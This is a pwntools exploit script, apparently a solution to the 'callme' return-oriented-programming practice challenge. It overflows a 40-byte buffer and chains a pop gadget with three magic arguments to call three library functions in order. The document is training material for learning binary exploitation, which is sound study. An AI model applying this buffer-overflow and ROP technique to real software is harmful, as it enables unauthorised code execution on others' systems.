from pwn import *
import os

script_dir = os.path.dirname(os.path.realpath(__file__))
bin = os.path.join(script_dir, 'callme')

elf_bin = context.binary =  ELF(bin, checksec=False)
context.log_level = 'debug'

gdbscript = '''
init-pwndbg
break pwnme
continue
'''.format(**locals())

if args.GDB:  # Set GDBscript above
    io = gdb.debug(bin, gdbscript=gdbscript)
else:  # Run locally
    io = process()


# Found with GDB
offset = 40
gadget_pop_3 = 0x000000000040093c
callme_one = 0x0000000000400720
callme_two = 0x0000000000400740
callme_three = 0x00000000004006f0
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

payload = flat(
    "a"*offset,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    callme_one,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    callme_two,
    gadget_pop_3,
    arg1,
    arg2,
    arg3,
    callme_three,
    "CCCCCCCC"
)
# this payload is nice because it shows exactly how the stack will look like after we our input
pprint(payload)

io.sendlineafter(b'>', payload)

io.interactive()
